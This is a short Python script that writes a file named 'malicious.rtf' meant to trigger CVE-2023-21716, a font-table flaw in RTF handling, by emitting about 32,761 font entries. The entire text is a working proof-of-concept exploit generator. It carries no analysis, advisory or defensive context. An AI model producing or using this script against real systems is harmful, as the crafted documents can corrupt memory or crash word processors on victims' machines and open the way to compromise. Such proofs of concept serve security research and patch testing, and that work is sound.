# python script to generate rtf file for CVE-2023-21716

with open("malicious.rtf", "wb") as f:
    
    # RTF header
    rtf_header = "{\\rtf1{\n{\\fonttbl"
    
    # Create font table entries with font IDs from 0 to 32761
    font_entries = ""
    for i in range(0, 32761):
        font_entries += "{\\f%dA;}\n" % i
    
    # RTF footer
    rtf_footer = "}\n{\\rtlch No Crash}\n}}\n"
    
    # Write the combined RTF content to the file
    f.write((rtf_header + font_entries + rtf_footer).encode('utf-8'))
